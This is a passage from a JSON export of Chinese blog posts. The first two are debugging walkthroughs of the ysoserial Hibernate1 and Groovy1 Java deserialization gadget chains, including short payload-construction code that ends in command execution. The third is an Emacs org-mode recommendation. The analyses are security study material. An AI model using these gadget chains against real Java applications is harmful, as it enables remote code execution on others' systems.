BasicPropertyAccessor$BasicGetter 实例，并赋值了 clazz、method、propertyName 属性，然后放到 Getter 数组中。类图大致如下：\n最后执行的是 makeCaller(tpl, getters) ，通过反射机制进行一系列生成实例、赋值属性的操作，然后返回一个 HashMap 对象。\nReflections 类封装了一些反射机制的操作，注意到生成 PojoComponentTuplizer 实例时调用的是 createWithoutConstructor 方法，实际上会使用 Object 类的构造方法，所以实例中的属性基本都是 null。接着将之前构造的 BasicPropertyAccessor$BasicGetter 赋值给 getters 属性。\n生成 ComponentType 实例时，使用的是其父类 AbstractType 的默认构造方法，然后赋值了 componentTuplizer、propertySpan、propertyTypes 三个属性。\nGadgets.makeMap(v1, v2) 将两个相同的 TypedValue 实例写入到 HashMap 中，payload 的构造到此就完成了，当目标应用反序列化这个 HashMap 对象时，我们写入的命令就会执行。\nHashMap 的类图大致如下：\n反序列化过程 使用 jdk 反序列化 HashMap 对象，自然会调用其 readObject 方法，所以以该方法作为入口点，调试分析 HashMap 对象反序列化的过程。\n如下图，在 readObject 方法中，局部变量 mappings 的值为 size 属性的值 2：\n一直执行到方法最后的 for 循环，从注释可以知道在这个循环中取出所有 key 和 value，并保存到 HashMap 对象中。这里用到了上面的 mappings 变量，如果 mappings 变量是 0，就无法进入循环了。\n跟进最后一行的 hash(key) ，这里的 key 是 TypedValue 类的对象。\n调用 TypedValue.hashCode 方法：\npublic int hashCode() { return (Integer)this.hashcode.getValue(); } 其中 this.hashcode 属性是一个匿名内部类：\nprivate void initTransients() { this.hashcode = new ValueHolder(new DeferredInitializer\u0026lt;Integer\u0026gt;() { public Integer initialize() { return TypedValue.this.value == null ? 0 : TypedValue.this.type.getHashCode(TypedValue.this.value); } }); } 可以看到匿名内部类中有一个 initialize 方法，这个方法会在 getValue 方法中被调用。从上面的类图可以很清楚地看到，TypedValue 的 value 属性和 type 属性分别是 TemplatesImpl 对象和 ComponentType 对象。\n继续跟进代码的执行过程：\n执行到 PojoComponentTuplizer 的 getPropertyValue 方法，并获取我们之前构造的 BasicPropertyAccessor$BasicGetter 对象，执行其 get 方法，参数是我们传入的 TemplatesImpl 对象。\n通过反射机制调用 TemplatesImpl.getOutputProperties 方法：\n跟进 newTransformer 方法：\n然后进入我们的最终的目标方法 getTransletInstance：\n之所以在开始设置 TemplatesImpl 的 _name 属性，就是为了通过这里的 if 判断。\n此时 _class 的值是 null，调用 defineTransletClasses 方法将 _bytecodes 中的每个 byte[] 数组还原成一个 Class 对象，写到 _class 中。\n可见此时的 _class[0] 是我们通过 Javassit 库构造的 StubTransletPayload 类，它的静态代码块保存着我们要执行的命令。\n紧接着实例化了这个类，成功执行命令。\n这里还留意到 _class[1] 也是我们构造的 Foo 类，然而这个类似乎对过程没什么影响，不太明白构造这个类的用意🤔\n","date":"2021-01-26","permalink":"https://zrquan.github.io/posts/ysoserial-hibernate1/","tags":["java","deserialize"],"title":"Ysoserial-Hibernate1"},{"content":"最近想要加强一下自己的代码能力和漏洞分析能力，于是想到学习 ysoserial 的代码。文章主要记录自己调试的过程，理清利用链的思路，对一些基础知识不会做过多解释。\n源代码 一些导入包、注释、声明之类的就忽略了，下面给出主要的 getObject 函数，该函数返回一个恶意对象(AnnotationInvocationHandler)，当反序列化这个对象时就能执行命令。\npublic InvocationHandler getObject(final String command) throws Exception { final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, \u0026quot;execute\u0026quot;), \u0026quot;entrySet\u0026quot;); final Map map = Gadgets.createProxy(closure, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map); return handler; } 可以看到代码很少，除了 return 一共就三行，在调试前先简要说一下每行代码的作用：\n创建一个 closure 对象，将我想执行的命令(command)保存到该对象的属性中。该类实现了 InvocationHandler 接口，所以可以作为动态代理的处理器；\n创建一个 map 对象，实则是一个动态代理对象，调用这个对象的方法时会代理到上面的 closure 对象的处理逻辑中(invoke)；\n创建最终的恶意对象，把上面的动态代理对象 map 保存到属性中，当反序列化 handler 时，就会通过层层调用最终执行 closure 里面的命令。\n构造 payload 首先看一下 ConvertedClosure 类的构造函数：\n调用了父类的构造函数并设置了 methodName 属性，跟进其父类 ConversionHandler 的构造函数：\n接着跟进 MethodClosure 类的初始化过程：\n以上过程的重点都是一些属性赋值的操作，而攻击反序列化过程就是要利用这些受我控制的属性去影响一些代码片段，而这些代码片段需要构成完整的利用链。\n这里先记录一下 closure 对象的一些关键属性，再接着看下去：\nclosure.methodName = \u0026quot;entrySet\u0026quot;; closure.delegate = new MethodClosure(command, \u0026quot;execute\u0026quot;); closure.delegate.method = \u0026quot;execute\u0026quot;; closure.delegate.owner = command; 接着是调用 Gadgets.createProxy 方法，通过 Proxy.newProxyInstance 创建一个 Map 类型的代理对象：\nnewProxyInstance 的第二个参数(allIfaces)是代理类要实现的接口，这里只有 Map.class ，所以可以通过 Class.cast 将类型转换成 Map。\n第三个参数(ih)是 InvocationHandler 类的对象，也就是上面的 closure，无论调用代理对象的那个方法，都会执行 InvocationHandler 对象中重写的 invoke 方法。\n最后再看看 Gadgets.createMemoizedInvocationHandler ：\ngetFirstCtor 方法可以通过反射得到 AnnotationInvocationHandler 类的构造函数，之所以通过反射机制，是因为 AnnotationInvocationHandler 的构造函数没有 public 修饰，不能通过 new 直接访问。\n从 AnnotationInvocationHandler 的构造函数看到，我传入的 map 对象将会赋值给 memberValues 属性：\n到这里为止，payload 的构造基本完成了，当这个 AnnotationInvocationHandler 对象被反序列化时，上述设置好的属性就会影响过程中的一些代码片段，最终导致命令执行。\n反序列化过程 反序列化的入口点自然是 readObject 方法，我们直接看看 AnnotationInvocationHandler.readObject() 都做了什么操作：\n看红色框部分就知道执行了 memberValues 属性的 entrySet 方法。\n而这个 memberValues 则是我传入的动态代理对象 map，调用它的方法实则执行 InvocationHandler.invoke() 。\n从调用栈可以知道，invoke 方法在 ConvertedClosure 的父类 ConversionHandler 中，在执行了一些版本判断相关的逻辑后，又跳到了 ConvertedClosure 的 invokeCustom 方法。\npublic Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable { return this.methodName != null \u0026amp;\u0026amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args); } 这里 \u0026amp;\u0026amp; 的优先级高于三目运算符，当 this.methodName 既不等于空也不等于 method.getName() 时返回 null，不然就会执行 ((Closure)this.getDelegate()).call(args)\n我们回顾一下在构造 payload 时，设置的一些属性：\nclosure.methodName = \u0026quot;entrySet\u0026quot;; closure.delegate = new MethodClosure(command, \u0026quot;execute\u0026quot;); closure.delegate.method = \u0026quot;execute\u0026quot;; closure.delegate.owner = command; 一开始就将 ConvertedClosure 对象的 methodName 属性设置为 entrySet，正好就是 AnnotationInvocationHandler.readObject() 中所执行的方法。\nthis.getDelegate() 会返回什么也很显而易见了，那么跟进一下 call() ：\n直接进入到 MetaClassImpl 类的 invokeMethod 方法中，紧接着调用一个重载的 invokeMethod 方法。\n这个函数代码比较多，但是我们只需要跟踪 object 参数，因为需要执行的命令在这个参数对象的属性中。\n运行到以下代码，我想要执行的命令被拿了出来：\nownerMetaClass 依然是 MetaClassImpl 类，所以这里递归调用了 invokeMethod 方法，不过 MethodClosure 对象变成了我要执行的命令，也就是 String。\n因此这一次不会进入 if (isClosure) ，而是执行到以下 return 语句中\nreturn method != null ? method.doMethodInvoke(object, arguments) : this.invokePropertyOrMissing(object, methodName, originalArguments, fromInsideClass, isCallToSuper); 命令字符串从 doMethodInvoke 进入到 ProcessGroovyMethods.execute ，最终导致命令执行：\n","date":"2021-01-19","permalink":"https://zrquan.github.io/posts/ysoserial-groovy1/","tags":["java","deserialize"],"title":"Ysoserial-Groovy1"},{"content":" 这好像是我第三次开始写博客了，前两次都是水了几篇笔记就放弃了，一方面是我本来就不喜欢写东西，另一方面是感觉写博客太花时间了，主题、格式、配置一顿折腾，又写不出什么有营养的东西😂\n但最近沉迷于 emacs 和 org mode，好像让我找到了做笔记的快感(虽然还没做多少)，所以打算再尝试一次，希望能坚持下去。\n那第一篇文章自然是要推荐一下无敌的 org mode 啦，事先声明本文主要是为了安利，展示一下 org mode 可以干什么，想看教程的话建议看官方文档。\n什么是 org mode 和大家熟悉的 markdown 一样，org mode 也可以通过不同的标记来组织文本的格式、结构，而且支持的标记和功能更加丰富。除了写文章，你还可以用它来管理日程、记录待办事项、文学编程、写 LaTeX 等等。\n官网上的示例 #+title: Example Org File #+author: TEC #+date: 2020-10-27 * Revamp orgmode.org website The /beauty/ of org *must* be shared. [[https://upload.wikimedia.org/wikipedia/commons/b/bd/Share_Icon.svg]] ** DONE Make screenshots CLOSED: [2020-09-03 Thu 18:24] ** DONE Restyle Site CSS Go through [[file:style.scss][stylesheet]] ** TODO Check CSS on main pages [42%] - [X] Index page - [X] Quickstart - [ ] Features - [ ] Releases - [X] Install - [ ] Manual - [ ] Contribute * Learn Org Org makes easy things trivial and complex things practical. You don't need to learn Org before using Org: read the quickstart page and you should be good to go. If you need more, Org will be here for you as well: dive into the manual and join the community! ** Feedback #+include: \u0026quot;other/feedback.org*manual\u0026quot; :only-contents t * Check CSS minification ratios #+begin_src python from pathlib import Path cssRatios = [] for css_min in Path(\u0026quot;resources/style\u0026quot;).glob(\u0026quot;*.min.css\u0026quot;): css = css_min.with_suffix('').with_suffix('.css') cssRatios.append([css.name, \u0026quot;{:.0f}% minified ({:4.1f} KiB)\u0026quot;.format( 100 * css_min.stat().st_size / css.stat().st_size, css_min.stat().st_size / 1000)]) return cssRatios #+end_src #+RESULTS: | index.css | 76% minified ( 1.4 KiB) | | org-demo.css | 77% minified ( 2.8 KiB) | | errors.css | 74% minified ( 4.9 KiB) | | org.css | 75% minified (10.7 KiB) | 上面的 org 文件在我的 emacs 上的样子：\n除了简单的渲染，org mode 还提供了很多命令和函数，让你可以对不同类型的文本进行各种操作。\n基本功能 一个 org 文件的基本结构是一棵树，以此来表现不同段落的层级关系，你可以很方便地对不同的节点或子树进行折叠、展开、隐藏等各种操作，专注于文件的某一部分而不受其他信息的影响。\nOrg mode 提供了表格编辑功能，一些基础操作比如：行列编辑、自动对齐、表格计算等等，都可以通过简单的命令或者快捷键完成。\nOrg mode 的代码块不仅仅提供高亮，它可以给数十种语言提供统一的执行环境，传递每个代码块的执行结果。简单来说，你可以用 org mode 进行(文学)编程，类似于 Jupyter Notebook。\n在 org mode 可以很方便地插入各种类型的链接，包括网页、文件、邮件、git 仓库等等，如果你熟悉 elisp，甚至可以自定义链接类型，更改链接的行为。不过我也是 emacs 和 org mode 的初学者，对 elisp 还不太熟悉，感兴趣的话可以看看官方的示例。\n你可以用 org mode 来写几乎任何类型的作品，因为它提供了一个功能强大、扩展性高的导出引擎，你可以自定义导出文件的格式。同时 org mode 也支持 Pandoc 作为导出工具。\n因为我很少将 org 文件导出到其他格式中，所以没怎么折腾这方面的配置，就只演示一下将 org 文件导出成 html 文档吧。\nOrg mode 还有很多功能，比如你可以给每个标题设置标签、属性、附件、时间戳，可以很方便地修改图片大小、导出样式，还可以用 Drawer 隐藏一些信息，以及很多我还没了解到的功能。下面的章节介绍一些常用的，且我个人觉得很有帮助的功能和插件，剩下的就不一一展示了，建议有兴趣的直接去看官方手册。\nCapture \u0026amp; Refile 用过 OneNote 的应该知道它有一个“快速笔记”，用来快速记录一些灵感或者摘抄，待之后再进行整理。Org mode 的 Capture 同样可以让你在(emacs 上)任何地方进行笔记，然后自动保存到你设置好的 org 文件中。\nOrg Capture 更好用的地方是，你可以自定义”快速笔记”的模板、保存方式，比如以下设置：\n(setq org-capture-templates '((\u0026quot;i\u0026quot; \u0026quot;待办事项\u0026quot; entry (file \u0026quot;~/org/blog/inbox.org\u0026quot;) \u0026quot;* TODO %?\\n %T\\n %i\\n\u0026quot;) (\u0026quot;n\u0026quot; \u0026quot;快速笔记\u0026quot; entry (file \u0026quot;~/org/blog/quick-notes.org\u0026quot;) \u0026quot;* %?\\n%x\\n\u0026quot; :jump-to-captured t) )) 这段代码设置了两个 Capture 模板——一个是待办事项，快捷键是 i ，它会自动创建一个 TODO 事项并插入当前的时间戳，保存到 inbox.org 文件中；另一个是快速笔记，快捷键是 n ，它会自动粘贴剪切板的文本到笔记中，且在完成后跳转到笔记文件。\n当你需要整理 Capture 笔记时，可以用 Refile 功能，它可以将一个段落转移或复制到任意 org 文件中，或其他段落下。你也可以用复制粘贴做到这一点，但 Refile 更优雅😎\nOrg Agenda Org Agenda 是一个日程管理工具，提供了一个界面进行日程相关的操作。\n前面提到了 TODO 关键字，实际上你可以自定义任意关键字来说明该事项的状态，比如：\n(setq org-todo-keywords '((sequence \u0026quot;TODO(t)\u0026quot; \u0026quot;WAIT(w)\u0026quot; \u0026quot;SOMEDAY(s)\u0026quot; \u0026quot;|\u0026quot; \u0026quot;DONE(d!)\u0026quot; \u0026quot;CANCELED(c@/!)\u0026quot;))) 以上代码设置了 5 种状态，后两种意味着该事项已经结束了(完成或取消)， d! 这个叹号指当事项切换为 DONE 时会插入当前的时间， c@/! 不仅插入时间，还可以写注释说明取消的原因。\n除此之外还可以给每个事项设置日期时间、优先级、deadline，然后通过 Org Agenda 进行统一管理：\n❗ Agenda 的界面是可以自己配置的，你可以将日程视图改成你喜欢的样子。\n一些扩展包 Org mode 的另一强大之处，是它运行在 emacs 这个平台上，emacs 强大的扩展性可以让开发者为 org mode 创作各种各样的插件，满足你做笔记、写博客、写论文、管理个人 wiki 甚至写 PPT 等各种需求。\n下面介绍一些我正在使用的扩展包，详细的功能请到各自的主页去了解。除了这些还有很多扩展包，有一些我也在用的用来加强原生功能的包我没写出来，等你们真正使用 org mode 时自然会去了解了。\norg-brain Homepage: http://github.com/Kungsgeten/org-brain\n可以像思维导图一样组织你的笔记，管理不同笔记间的逻辑关系，而且提供了一个类似个人 wiki 界面的 visualize 模式。\nPINNED: Index +-Python Game development-+-Game design +-Programming books | Programming-+-Emacs | | | +-----------------+-----------------+ | V Game programming \u0026lt;-\u0026gt; Computer games Game Maker Unity --- Resources --------------------------------- - https://en.wikipedia.org/wiki/Game_programming - Passing Through Ghosts in Pac-Man - In-House Engine Development: Technical Tips --- Text -------------------------------------- Game programming is the art of programming computer games... org-journal Homepage: http://github.com/bastibe/org-journal\n写日记专用，方便自动生成日记，配置日记模板，而且提供强大的搜索功能。\n示例日记 * Tuesday, 06/04/13 ** 10:28 Company meeting Endless discussions about projects. Not much progress ** 11:33 Work on org-journal For the longest time, I wanted to have a cool diary app on my computer. However, I simply lacked the right tool for that job. After many hours of searching, I finally found PersonalDiary on EmacsWiki. PersonalDiary is a very simple diary system based on the emacs calendar. It works pretty well, but I don't really like that it only uses unstructured text. Thus, I spent the last two hours making that diary use org-mode and represent every entry as an org-mode headline. Very cool! ** 15:33 Work on org-journal Now my journal automatically creates the right headlines (adds the current time stamp if on the current day, does not add a time stamp for any other day). Additionally, it automatically collapses the headlines in the org-file to the right level (shows everything if in view mode, shows only headlines in new-entry-mode). Emacs and elisp are really cool! ** 16:40 Work on org-journal I uploaded my journal mode to marmalade and Github! Awesome! ** TODO teach org-journal how to brew coffee ox-hugo Homepage: https://ox-hugo.scripter.co\n将 org 文件导出为 hugo 的 markdown 文件，支持大部分 hugo 配置，而且你可以选择导出某个子树为一篇文章，设置了 TODO 的子树被视为草稿。\n现在这个博客就是用这个包导出文章的。\norg-reveal Homepage: https://github.com/yjwen/org-reveal\n前面我说可以用 org mode 写 PPT，并不是真的能写 PPT，但是 org-reveal 可以借助前端框架 reveal.js 将 org 文件导出成一个幻灯片网页。\n虽然功能上可能没 PPT 那么丰富，但是绝对可以应付大部分工作展示的需求，关键是可以让你从各种字体图片的大小、位置、尺寸问题中解脱，像写文章一样写幻灯片，你只需要专注于内容。\norg-drill Homepage: https://gitlab.com/phillord/org-drill\n通过 org mode 实现类似于“记忆卡片”的功能，可以选择不同记忆算法来制定复习计划，搭配 org capture 来制作生词本效果很好，我准备用它来背英语单词。\n分享一篇教学文章：https://jmm.io/pr/emacs-meetup/#/ ，这文章就是用 reveal.js 制作的。\n最后 其实自己习惯的工具才是效率最高的，如果你只是想要一个可以快速上手使用的工具，org mode 可能不适合你，因为学习成本太高了(主要是 emacs 上手难)。\n我个人比较喜欢折腾各种工具软件，我把 emacs 和 org mode 也是看作需要不断学习的知识，所以对这种一边用一边学的状态还挺乐在其中的。但不得不说这很容易让你上头，耽误你学习真正需要的知识的时间。\n即使这篇是安利文章，最后还是劝你谨慎入坑🙃\n","date":"2021-01-09","permalink":"https://zrquan.github.io/posts/org-mode/","tags":["emacs","org-mode"],"title":"My life in plain text"}]